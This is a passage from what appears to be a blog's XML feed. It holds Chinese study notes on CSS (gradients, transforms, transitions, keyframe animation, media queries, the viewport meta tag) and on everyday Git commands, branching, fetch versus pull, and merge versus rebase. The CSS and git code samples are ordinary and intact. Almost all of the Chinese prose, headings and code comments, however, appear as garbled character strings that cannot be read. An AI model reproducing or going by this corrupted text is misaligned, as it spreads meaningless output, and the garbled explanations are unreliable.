30%;</span><br><span class="line">  height: 50px;</span><br><span class="line">  margin: 10px 1.5% 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-æ¸å˜"><a href="#5-æ¸å˜" class="headerlink" title="5. æ¸å˜"></a>5. æ¸å˜</h3><ul><li><p>çº¿æ€§æ¸å˜</p><style>.line1, .line2{  width: 100%;  height: 8px;  margin-top: 20px;}.line1{  background-image:linear-gradient(to right, yellow, green);}.line2{  background-image: linear-gradient(to left, #fff 0%, #000 50%, #fff 100%);}</style><div class="line1"></div><div class="line2"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// å…³é”®å­—å¯ä½¿ç”¨to top, to top leftç­‰</span><br><span class="line">background-image: linear-gradient(to left / 90deg, orange, green);</span><br><span class="line"></span><br><span class="line">// è‡ªå®šä¹‰æ¸å˜</span><br><span class="line">background-image: linear-gradient(to left, #fff 0%, #000 50%, #fff 100%);</span><br></pre></td></tr></table></figure></li><li><p>å¾„å‘æ¸å˜</p><style>.gradient-block div{  display: inline-block;  width: 100px;  height: 50px;}.block1 {  background-image: radial-gradient(circle, yellow, green)}.block2{  background-image: radial-gradient(circle at top, yellow, green)}.block3{  background-image: radial-gradient(ellipse, yellow, green)}.block4{  background-image: radial-gradient(100px 100px at 30px 30px, yellow, green)}.block5{  background-image: radial-gradient(circle, yellow 10%, green 20%, orange 80%)}.block6{  background-image: repeating-radial-gradient(yellow, green 10px, orange 20px)}</style><div class="gradient-block">  <div class="block1"></div>  <div class="block2"></div>  <div class="block3"></div>  <div class="block4"></div>  <div class="block5"></div>  <div class="block6"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// åŸå½¢æ¸å˜</span><br><span class="line">background-image: radial-gradient(circle, yellow, green)</span><br><span class="line">background-image: radial-gradient(circle at top, yellow, green)</span><br><span class="line"></span><br><span class="line">// æ¤­åœ†æ¸å˜</span><br><span class="line">background-image: radial-gradient(ellipse, yellow, green)</span><br><span class="line"></span><br><span class="line">// è‡ªå®šä¹‰åœ†å¿ƒå’ŒåŠå¾„([minor radius] [major radius] at x y) å¯ä»¥ç”¨ç™¾åˆ†æ¯”</span><br><span class="line">background-image: radial-gradient(100px 100px at 30px 30px, yellow, green)</span><br><span class="line"></span><br><span class="line">// å¤šè‰²æ¸å˜</span><br><span class="line">background-image: radial-gradient(circle, yellow 10%, green 50%, orange 80%)</span><br><span class="line"></span><br><span class="line">// é‡å¤é•œåƒæ¸å˜</span><br><span class="line">background-image: repeating-radial-gradient(yellow, green 10px, orange 20px)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-å˜å½¢-transform"><a href="#6-å˜å½¢-transform" class="headerlink" title="6. å˜å½¢ transform"></a>6. å˜å½¢ transform</h3><p>CSSå˜å½¢å…è®¸åŠ¨æ€çš„æ§åˆ¶å…ƒç´ ï¼Œå¯ä»¥åœ¨å±å¹•å‘¨å›´ç§»åŠ¨å®ƒä»¬ï¼Œç¼©å°æˆ–æ‰©å¤§ï¼Œæ—‹è½¬ï¼Œæˆ–ç»“åˆäº§ç”Ÿå¤æ‚çš„åŠ¨ç”»æ•ˆæœã€‚ä¸€ç³»åˆ—çš„<code>&lt;transform-function&gt;</code>ï¼Œè¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªå˜å½¢å‡½æ•°ï¼Œä»¥ç©ºæ ¼åˆ†å¼€ï¼Œä»£è¡¨åŒæ—¶å¯¹ä¸€ä¸ªå…ƒç´ è¿›è¡Œå˜å½¢çš„å¤šç§å±æ€§æ“ä½œã€‚<br><style>  .transform div{    width: 100px;    height: 50px;    background-color: green;    color: #fff;    display: inline-block;    vertical-align: middle;    text-align: center;    line-height: 50px;  }  .transform1:hover{    transform: scale(1.5) rotate(30deg)  }  .transform2{    transform: rotate(30deg);    transform-origin: 100% 100%;  }</style><div class="transform">  <div class="transform1">hover me</div>  <div class="transform2"></div></div></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">transform: none | &lt;transform-function&gt; &lt;transform-function&gt; ..</span><br><span class="line"></span><br><span class="line">// åŸºæœ¬å˜å½¢</span><br><span class="line">transform: translate(40px, 40px) scale(1.5) rotate(30deg)</span><br><span class="line"></span><br><span class="line">// æŒ‡å®šä¸­å¿ƒç‚¹</span><br><span class="line">transform-origin: 100% 100%</span><br></pre></td></tr></table></figure><p><br></p><table><thead><tr><th>2D transformå‡½æ•°</th><th style="text-align:center">åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td>translate(10px, 10px)</td><td style="text-align:center">ç§»åŠ¨å…ƒç´ ã€‚æ‰©å±•å‡½æ•°translateX(), translateY()</td></tr><tr><td>scale(1.5)</td><td style="text-align:center">ç¼©å°æˆ–æ”¾å¤§å…ƒç´ ã€‚æ‰©å±•å‡½æ•°scaleX(), scaleY()</td></tr><tr><td>rotate(10deg)</td><td style="text-align:center">æ—‹è½¬å…ƒç´ </td></tr><tr><td>skew(10deg)</td><td style="text-align:center">è®©å…ƒç´ å€¾æ–œã€‚æ‰©å±•å‡½æ•°skewX(), skewY()</td></tr><tr><td>matrix()</td><td style="text-align:center">å®šä¹‰çŸ©é˜µå˜å½¢ï¼Œé‡æ–°å®šä½å…ƒç´ ä½ç½®</td></tr><tr><td><strong>3D transformå‡½æ•°</strong></td><td style="text-align:center">translate3d(), translate(), scale3d(), scaleZ(), rotate3d(), <br>rotateX(), rotateY(), rotateZ(), perspective(), matrix3d()</td></tr><tr><td><strong>å…¶ä»–å±æ€§</strong></td><td style="text-align:center"></td></tr><tr><td>transform-origin</td><td style="text-align:center">æŒ‡å®šå…ƒç´ çš„ä¸­å¿ƒç‚¹çš„ä½ç½®</td></tr><tr><td>transform-style</td><td style="text-align:center"><code>flat</code>2Då¹³é¢å‘ˆç°ï¼Œ <code>preserve-3d</code>3Dç©ºé—´ä¸­å‘ˆç°</td></tr></tbody></table><p><br></p><h3 id="7-è¿‡æ¸¡-transition"><a href="#7-è¿‡æ¸¡-transition" class="headerlink" title="7. è¿‡æ¸¡ transition"></a>7. è¿‡æ¸¡ transition</h3><p>CSSçš„transitionå…è®¸CSSçš„å±æ€§å€¼åœ¨ä¸€å®šçš„æ—¶é—´åŒºé—´å†…å¹³æ»‘åœ°è¿‡æ¸¡ã€‚<br><style>.transition div{  width: 100px;  height: 100px;  background-color: green;  text-align: center;  color: #fff;  line-height: 100px;  display: inline-block;  vertical-align: middle;}.transition1:hover{  background-color: orange;  border-radius: 50%;  transition: background 0.5s linear 0s, border-radius 0.2s ease-in 0s;}</style><div class="transition">  <div class="transition1">hover me</div></div></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">transition: &lt;transition-property&gt; &lt;transition-duration&gt; </span><br><span class="line">            &lt;transition-timing-function&gt; &lt;transition-delay&gt; , ...</span><br><span class="line"></span><br><span class="line">// é€Ÿè®°: transition: property, duration, animation type, delay</span><br></pre></td></tr></table></figure><p><em><code>transition-property</code></em><br>æŒ‡å®šè¿‡æ¸¡æˆ–åŠ¨æ€æ¨¡æ‹Ÿçš„CSSå±æ€§ã€‚<br>æ”¯æŒtransitionè¿‡æ¸¡åŠŸèƒ½çš„CSSå±æ€§: background-color, background-position, opacity, border, outline, margin, padding, width, height, min/max-width/height, top/bottom/left/right, color, font-size, font-weight, letter-spacing, line-height, text-indent, text-shadow, vertical-align, word-spacing, z-index, visibility</p><p><em><code>transition-duration</code></em><br>æŒ‡å®šå®Œæˆè¿‡æ¸¡æ‰€éœ€çš„æ—¶é—´ï¼Œå•ä½ä¸ºsæˆ–ms(æ¯«ç§’)ã€‚</p><p><em><code>transition-timing-function</code></em><br>æŒ‡å®šè¿‡æ¸¡å‡½æ•°ã€‚<br>ease: é»˜è®¤å€¼ï¼Œè¿‡æ¸¡é€Ÿåº¦ç”±å¿«åˆ°æ…¢ï¼Œé€æ¸å˜æ…¢<br>linear: æ’é€Ÿ<br>ease-in: åŠ é€Ÿ<br>ease-out: å‡é€Ÿ<br>ease-in-out: å…ˆåŠ é€Ÿåå‡é€Ÿ</p><p><em><code>transition-delay</code></em><br>æŒ‡å®šè¿‡æ¸¡å¼€å§‹å‡ºç°çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ä¸ºsæˆ–ms(æ¯«ç§’)ã€‚</p><p><br></p><h3 id="8-åŠ¨ç”»-keyframes"><a href="#8-åŠ¨ç”»-keyframes" class="headerlink" title="8. åŠ¨ç”» @keyframes"></a>8. åŠ¨ç”» @keyframes</h3><style>@keyframes wobble{  0%{ margin-left: 100px; background: green; }  40%{ margin-left: 150px; background: orange; }  60%{ margin-left: 75px; background: blue; }  100%{ margin-left: 100px; background: red; }}.animation{  width: 100px;  height: 100px;  animation: wobble 2s ease-in 0s infinite;}</style><div class="animation"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@keyframes wobble&#123;</span><br><span class="line">  0%&#123; margin-left: 100px; background: green; &#125;</span><br><span class="line">  40%&#123; margin-left: 150px; background: orange; &#125;</span><br><span class="line">  60%&#123; margin-left: 75px; background: blue; &#125;</span><br><span class="line">  100%&#123; margin-left: 100px; background: red; &#125;</span><br><span class="line">&#125;</span><br><span class="line">.animation&#123;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">  animation: wobble 2s ease-in 0s infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å†™è§„åˆ™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">animation: &lt;animation-name&gt; &lt;animation-duration&gt;</span><br><span class="line">           &lt;animation-timing-function&gt; &lt;animation-delay&gt;</span><br><span class="line">           &lt;animation-iteration-count&gt; &lt;animation-direction&gt;</span><br><span class="line">           &lt;animation-play-state&gt; &lt;animation-fill-mode&gt;, ...</span><br></pre></td></tr></table></figure></p><p><em><code>@keyframes</code></em><br>å…³é”®å¸§ï¼Œ ç”±@keyframeså¼€å¤´ï¼Œåé¢ç´§è·ŸåŠ¨ç”»çš„åç§°ï¼ŒåŠ ä¸Šä¸€å¯¹èŠ±æ‹¬å·ï¼Œé‡Œé¢çš„æ ·å¼è§„åˆ™ç”±å¤šä¸ªç™¾åˆ†æ¯”æ„æˆï¼Œæ¯ä¸ªç™¾åˆ†æ¯”ä¸­æ˜¯ä¸åŒçš„CSSæ ·å¼ã€‚</p><p><em><code>animation-name</code></em><br>æŒ‡å®šä¸€ä¸ªå…³é”®å¸§åŠ¨ç”»çš„åå­—ï¼Œè¿™ä¸ªåŠ¨ç”»åå¿…é¡»å¯¹åº”ä¸€ä¸ª@keyframesè§„åˆ™</p><p><em><code>animation-duration</code></em><br>è®¾ç½®åŠ¨ç”»æ’­æ”¾æ‰€éœ€æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯å®Œæˆä»0%~100%ä¸€æ¬¡åŠ¨ç”»æ‰€éœ€æ—¶é—´ã€‚å•ä½ä¸ºs</p><p><em><code>animation-timing-function</code></em><br>è®¾ç½®åŠ¨ç”»çš„æ’­æ”¾æ–¹å¼ï¼Œå˜æ¢æ–¹å¼ease, ease-in, ease-in-out, ease-out, linear, cubic-bezierã€‚</p><p><em><code>animation-delay</code></em><br>æŒ‡å®šåŠ¨ç”»å¼€å§‹æ—¶é—´ï¼Œå•ä½ä¸ºs</p><p><em><code>animation-iteration-count</code></em><br>æŒ‡å®šåŠ¨ç”»æ’­æ”¾çš„å¾ªç¯æ¬¡æ•°ã€‚ <code>infinite | &lt;integer&gt;</code></p><p><em><code>animation-direction</code></em><br>æŒ‡å®šåŠ¨ç”»çš„æ’­æ”¾æ–¹å‘, normalä¸ºå‘å‰æ’­æ”¾ï¼Œalternateä¸ºåæ–¹å‘æ’­æ”¾</p><p><em><code>animation-play-state</code></em><br>æ§åˆ¶åŠ¨ç”»çš„æ’­æ”¾çŠ¶æ€, pausedå°†æ­£åœ¨æ’­æ”¾çš„åŠ¨ç”»åœä¸‹æ¥ï¼Œ runingå°†æš‚åœçš„åŠ¨ç”»é‡æ–°æ’­æ”¾</p><p><em><code>animation-fill-mode</code></em><br>å®šä¹‰åŠ¨ç”»å¼€å§‹å‰å’Œç»“æŸåå‘ç”Ÿçš„æ“ä½œã€‚noneæŒ‰é¢„æœŸè¿›è¡Œå’Œç»“æŸï¼ŒåŠ¨ç”»å®Œæˆå…¶æœ€åä¸€å¸§æ—¶ï¼ŒåŠ¨ç”»ä¼šç¿»è½¬åˆ°åˆå§‹å¸§å¤„ã€‚ forwards åŠ¨ç”»ç»“æŸåç»§ç»­åº”ç”¨æœ€åå¸§çš„ä½ç½®ã€‚ backwards åœ¨å‘å…ƒç´ åº”ç”¨åŠ¨ç”»æ ·å¼æ—¶è¿…é€Ÿåº”ç”¨åŠ¨ç”»çš„åˆå§‹å¸§ã€‚ bothå…ƒç´ åŠ¨ç”»åŒæ—¶å…·æœ‰forwardså’Œbackwardsçš„æ•ˆæœã€‚</p><p><br></p><h3 id="9-åª’ä½“æŸ¥è¯¢"><a href="#9-åª’ä½“æŸ¥è¯¢" class="headerlink" title="9. åª’ä½“æŸ¥è¯¢"></a>9. åª’ä½“æŸ¥è¯¢</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@media screen and (max-width:600px)&#123;&#125;</span><br><span class="line">@media screen and (min-width:600px) and (max-width:900px)&#123;&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="10-metaæ ‡ç­¾"><a href="#10-metaæ ‡ç­¾" class="headerlink" title="10. metaæ ‡ç­¾"></a>10. metaæ ‡ç­¾</h3><p>å½“responsiveé¡µé¢åœ¨æ‰‹æœºæµ‹è¯•çš„æ—¶å€™ï¼Œä¼šå‘ç°åª’ä½“æŸ¥è¯¢éƒ½ä¸ä¼šç”Ÿæ•ˆâ€”â€”é¡µé¢ä»å±•ç¤ºä½æ™®é€šæ ·å¼ï¼Œåªæ˜¯å…¨å±€ç¼©å°äº†ã€‚ è¿™æ—¶éœ€è¦æ·»åŠ <code>meta</code>æ ‡ç­¾<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">MDN - CSSå±‚å æ ·å¼è¡¨</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">Flex å¸ƒå±€æ•™ç¨‹ï¼šè¯­æ³•ç¯‡</a></li><li>ã€Šå›¾è§£CSS3Â·æ ¸å¿ƒæŠ€æœ¯ä¸æ¡ˆä¾‹å®è·µã€‹ å¤§æ¼ [è‘—]</li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Gitå‘½ä»¤</title>
      <link href="/2018/09/13/Git%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/09/13/Git%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h3 id="1-Gitç®€ä»‹"><a href="#1-Gitç®€ä»‹" class="headerlink" title="1. Gitç®€ä»‹"></a>1. Gitç®€ä»‹</h3><ul><li>ã€ç›´æ¥è®°å½•å¿«ç…§ï¼Œè€Œéæ¯”è¾ƒå·®å¼‚ã€‘gitä¸å…¶ä»–ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ä¸»è¦å·®åˆ«åœ¨äºGitå¯¹å¾…æ•°æ®çš„æ–¹æ³•ã€‚å¤§éƒ¨åˆ†ç³»ç»Ÿä»¥æ–‡ä»¶å˜æ›´åˆ—è¡¨çš„æ–¹å¼å­˜å‚¨ä¿¡æ¯ã€‚åä¹‹,Gitå¯¹å¾…æ•°æ®æ›´åƒæ˜¯ä¸€ä¸ª <strong>å¿«ç…§æµ</strong>ã€‚æ¯æ¬¡ä½ æäº¤æ›´æ–°ï¼Œå®ƒä¼šå¯¹å½“æ—¶çš„å…¨éƒ¨æ–‡ä»¶åˆ¶ä½œä¸€ä¸ªå¿«ç…§å¹¶ä¿å­˜è¿™ä¸ªå¿«ç…§çš„ç´¢å¼•ã€‚ä¸ºäº†é«˜æ•ˆï¼Œå¦‚æœæ–‡ä»¶æ²¡æœ‰ä¿®æ”¹ï¼Œgitä¸å†é‡æ–°å­˜å‚¨æ”¹æ–‡ä»¶ï¼Œè€Œæ˜¯åªä¿ç•™äº†ä¸€ä¸ªé“¾æ¥æŒ‡å‘ä¹‹å‰å­˜å‚¨çš„æ–‡ä»¶ã€‚</li><li>ã€è¿‘ä¹æ‰€æœ‰æ“ä½œéƒ½æ˜¯æœ¬åœ°æ‰§è¡Œã€‘gitçš„å¤§éƒ¨åˆ†æ“ä½œéƒ½åªéœ€è®¿é—®æœ¬åœ°æ–‡ä»¶å’Œèµ„æºï¼Œå› ä¸ºä½ åœ¨æœ¬åœ°ç£ç›˜ä¸Šå°±æœ‰é¡¹ç›®çš„å®Œæ•´å†å²ã€‚</li><li>ã€gitä¿è¯å®Œæ•´æ€§ã€‘æ‰€æœ‰æ•°æ®å†å­˜å‚¨å‰éƒ½è®¡ç®—æ ¡éªŒå’Œï¼Œè¿™æ„å‘³ç€ä¸å¯èƒ½åœ¨gitä¸çŸ¥æƒ…æ—¶æ›´æ”¹ä»»ä½•æ–‡ä»¶å†…å®¹æˆ–ç›®å½•å†…å®¹ã€‚</li><li>ã€gitä¸€èˆ¬åªæ·»åŠ æ•°æ®ã€‘ä½ çš„gitæ“ä½œï¼Œå‡ ä¹åªå¾€gitæ•°æ®åº“ä¸­å¢åŠ æ•°æ®ã€‚å¾ˆéš¾è®©gitç›´è¡Œä¸å¯é€†æ“ä½œï¼Œæˆ–è€…è®©å®ƒä»¥ä»»ä½•æ–¹å¼æ¸…é™¤æ•°æ®ã€‚</li></ul><p><br></p><h3 id="2-Gitå‘½ä»¤"><a href="#2-Gitå‘½ä»¤" class="headerlink" title="2. Gitå‘½ä»¤"></a>2. Gitå‘½ä»¤</h3><h4 id="2-1-è·å–ä»“åº“"><a href="#2-1-è·å–ä»“åº“" class="headerlink" title="2.1 è·å–ä»“åº“"></a>2.1 è·å–ä»“åº“</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// åœ¨ç°æœ‰ç›®å½•ä¸­åˆå§‹åŒ–ä»“åº“</span><br><span class="line">$ git init</span><br><span class="line">$ git add *.c</span><br><span class="line">$ git add LICENSE</span><br><span class="line">$ git commit -m &apos;initial project version&apos;</span><br><span class="line"></span><br><span class="line">// å…‹éš†ç°æœ‰çš„ä»“åº“</span><br><span class="line">$ git clone https://github.com/libgit2/libgit2</span><br></pre></td></tr></table></figure><h4 id="2-2-è®°å½•æ¯æ¬¡æ›´æ–°åˆ°ä»“åº“"><a href="#2-2-è®°å½•æ¯æ¬¡æ›´æ–°åˆ°ä»“åº“" class="headerlink" title="2.2 è®°å½•æ¯æ¬¡æ›´æ–°åˆ°ä»“åº“"></a>2.2 è®°å½•æ¯æ¬¡æ›´æ–°åˆ°ä»“åº“</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">$ git diff --cached</span><br><span class="line">$ git add </span><br><span class="line">$ git commit -m &quot;description&quot;</span><br><span class="line">$ git log // æŸ¥çœ‹æäº¤å†å²</span><br></pre></td></tr></table></figure><h4 id="2-3-æ’¤é”€æ“ä½œ"><a href="#2-3-æ’¤é”€æ“ä½œ" class="headerlink" title="2.3 æ’¤é”€æ“ä½œ"></a>2.3 æ’¤é”€æ“ä½œ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// å‘ç°æ¼äº†å‡ ä¸ªæ–‡ä»¶æ²¡æœ‰æ·»åŠ ï¼Œæˆ–æäº¤ä¿¡æ¯å†™é”™ï¼Œå°è¯•é‡æ–°æäº¤</span><br><span class="line">$ git commit -m &apos;initial commit&apos;</span><br><span class="line">$ git add forgotten_file</span><br><span class="line">$ git commit --amend</span><br><span class="line"></span><br><span class="line">// å–æ¶ˆæš‚å­˜çš„æ–‡ä»¶ï¼Œæ„å¤–è¾“å…¥git add *ï¼Œå¦‚ä½•å–æ¶ˆæš‚å­˜ä¸¤ä¸ªä¸­çš„ä¸€ä¸ª</span><br><span class="line">$ git add *</span><br><span class="line">$ git reset HEAD &lt;file&gt;</span><br><span class="line"></span><br><span class="line">// æ’¤é”€å¯¹æ–‡ä»¶çš„ä¿®æ”¹ï¼Œå°†æ–‡ä»¶è¿˜åŸæˆä¸Šä¸€æ¬¡æäº¤æ—¶çš„æ ·å­</span><br><span class="line">$ git checkout -- &lt;file&gt;</span><br></pre></td></tr></table></figure><h4 id="2-4-è¿œç¨‹ä»“åº“çš„ä½¿ç”¨"><a href="#2-4-è¿œç¨‹ä»“åº“çš„ä½¿ç”¨" class="headerlink" title="2.4 è¿œç¨‹ä»“åº“çš„ä½¿ç”¨"></a>2.4 è¿œç¨‹ä»“åº“çš„ä½¿ç”¨</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">$ git remote add &lt;shortname&gt; &lt;url&gt;</span><br><span class="line">$ git fetch [remote-name] [branch-name]</span><br><span class="line">$ git push [remote-name] [branch-name]</span><br><span class="line">$ git remote rename [old-name] [new-name]</span><br><span class="line">$ git remote rm [remote-name]</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-Gitåˆ†æ”¯"><a href="#3-Gitåˆ†æ”¯" class="headerlink" title="3. Gitåˆ†æ”¯"></a>3. Gitåˆ†æ”¯</h3><h4 id="3-1-åˆ†æ”¯å‘½ä»¤"><a href="#3-1-åˆ†æ”¯å‘½ä»¤" class="headerlink" title="3.1 åˆ†æ”¯å‘½ä»¤"></a>3.1 åˆ†æ”¯å‘½ä»¤</h4><p>Gitçš„åˆ†æ”¯ï¼Œå…¶å®æœ¬è´¨ä¸Šä»…ä»…æ˜¯æŒ‡å‘æäº¤å¯¹è±¡çš„å¯å˜æŒ‡é’ˆã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -v</span><br><span class="line"></span><br><span class="line">// æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°é‚£ä¸ªåˆ†æ”¯ä¸Š</span><br><span class="line">$ git branch testing</span><br><span class="line">$ git checkout testing </span><br><span class="line">($ git checkout -b testing)</span><br><span class="line"></span><br><span class="line">// åˆå¹¶åˆ†æ”¯é‡åˆ°å†²çªï¼Œè§£å†³å†²çªåï¼Œå¯¹æ¯ä¸ªæ–‡ä»¶ä½¿ç”¨git addå‘½ä»¤å°†å…¶æ ‡è®°ä¸ºå†²çªå·²è§£å†³ã€‚</span><br><span class="line">$ git merge master --no-ff</span><br><span class="line"></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD:index.html</span><br><span class="line">&lt;div id=&quot;footer&quot;&gt;contact : email.support@github.com&lt;/div&gt;</span><br><span class="line">=======</span><br><span class="line">&lt;div id=&quot;footer&quot;&gt;</span><br><span class="line">please contact us at support@github.com</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; iss53:index.html</span><br><span class="line"></span><br><span class="line">// åˆ é™¤åˆ†æ”¯</span><br><span class="line">$ git branch -d testing</span><br></pre></td></tr></table></figure></p><h4 id="3-2-fetch-ä¸-pull"><a href="#3-2-fetch-ä¸-pull" class="headerlink" title="3.2 fetch ä¸ pull"></a>3.2 fetch ä¸ pull</h4><p>å½“<code>git fetch</code>å‘½ä»¤ä»æœåŠ¡å™¨ä¸ŠæŠ“å–æœ¬åœ°æ²¡æœ‰çš„æ•°æ®æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šä¿®æ”¹å·¥ä½œç›®å½•ä¸­çš„å†…å®¹ã€‚å®ƒåªä¼šè·å–æ•°æ®ç„¶åè®©ä½ è‡ªå·±åˆå¹¶ã€‚<code>git pull</code>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯ä¸€ä¸ª<code>git fetch</code>ç´§æ¥ç€ä¸€ä¸ª<code>git merge</code>å‘½ä»¤ã€‚</p><h4 id="3-3-gitå·¥ä½œæµç¨‹æœ€ä½³å®è·µ"><a href="#3-3-gitå·¥ä½œæµç¨‹æœ€ä½³å®è·µ" class="headerlink" title="3.3 gitå·¥ä½œæµç¨‹æœ€ä½³å®è·µ"></a>3.3 gitå·¥ä½œæµç¨‹æœ€ä½³å®è·µ</h4><p>Git Flowæ¨¡å‹ä¸­å®šä¹‰äº†ä¸»åˆ†æ”¯å’Œè¾…åŠ©åˆ†æ”¯ä¸¤ç±»åˆ†æ”¯ã€‚å…¶ä¸­ä¸»åˆ†æ”¯ç”¨äºç»„ç»‡ä¸è½¯ä»¶å¼€å‘ï¼Œéƒ¨ç½²ç›¸å…³çš„æ´»åŠ¨ï¼›è¾…åŠ©åˆ†æ”¯ä¸ºäº†è§£å†³ç‰¹å®šçš„é—®é¢˜è€Œè¿›è¡Œçš„å„ç§å¼€å‘æ´»åŠ¨ã€‚<a href="https://blog.csdn.net/Eacter/article/details/78552607" target="_blank" rel="noopener">å…·ä½“æŸ¥çœ‹</a></p><ul><li>ä¸»åˆ†æ”¯ï¼šmaster / develop</li><li>è¾…åŠ©åˆ†æ”¯ï¼š feature / release / hotfix<br><img src="/2018/09/13/Gitç¬”è®°/1.png" style="padding-top:20px"></li></ul><h4 id="3-4-å˜åŸºä¸åˆå¹¶"><a href="#3-4-å˜åŸºä¸åˆå¹¶" class="headerlink" title="3.4 å˜åŸºä¸åˆå¹¶"></a>3.4 å˜åŸºä¸åˆå¹¶</h4><ul><li>åˆå¹¶(Merge): å®ƒä¼šæŠŠä¸¤ä¸ªåˆ†æ”¯çš„æœ€æ–°å¿«ç…§(C3 å’Œ C4)ä»¥åŠä¸¤è€…çš„å…±åŒç¥–å…ˆ(C2)è¿›è¡Œä¸‰æ–¹åˆå¹¶ï¼Œåˆå¹¶çš„ç»“æœæ˜¯ç”Ÿæˆä¸€ä¸ªæ–°çš„å¿«ç…§(å¹¶æäº¤)ã€‚<br><img src="/2018/09/13/Gitç¬”è®°/2.png" style="padding-top:20px"></li></ul><p><br></p><ul><li>å˜åŸº(Rebase): æå–åœ¨C4ä¸­å¼•å…¥çš„è¡¥ä¸å’Œä¿®æ”¹ï¼Œç„¶åå†C3çš„åŸºç¡€ä¸Šåº”ç”¨ä¸€æ¬¡ã€‚<br><strong>å˜åŸºçš„é£é™©</strong>: å˜åŸºæ“ä½œçš„å®è´¨æ˜¯ä¸¢å¼ƒä¸€äº›ç°æœ‰çš„æäº¤ï¼Œç„¶åç›¸åº”åœ°æ–°å»ºä¸€äº›å†…å®¹ä¸€æ ·ä½†å®é™…ä¸Šä¸åŒçš„æäº¤ã€‚å¦‚æœä½ 